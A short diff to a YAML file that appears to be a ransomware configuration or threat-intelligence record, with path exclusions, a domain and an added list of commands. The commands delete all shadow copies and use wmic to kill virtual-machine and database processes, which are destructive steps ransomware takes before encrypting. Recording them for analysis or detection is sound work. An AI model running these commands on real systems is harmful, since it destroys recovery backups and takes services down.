@@ -6,6 +6,17 @@ exclude:
   - .sys
   - '%SYSTEMDRIVE%\Windows'
   - '%SYSTEMDRIVE%\ProgramData'
+command:
+  - vssadmin delete shadows /all /quiet
+  - wmic process where "name  like \'%vmwp%\'" call terminate
+  - wmic process where "name  like \'%virtualbox%\'" call terminate
+  - wmic process where "name  like \'%vbox%\'" call terminate
+  - wmic process where "name  like \'%sqlservr%\'" call terminate
+  - wmic process where "name  like \'%mysqld%\'" call terminate
+  - wmic process where "name  like \'%omtsreco%\'" call terminate
+  - wmic process where "name  like \'%oracle%\'" call terminate
+  - wmic process where "name  like \'%tnslsnr%\'" call terminate
+  - wmic process where "name  like \'%vmware%\'" call terminate
 domain:
   - update.ajaxrenew.com
 filename:
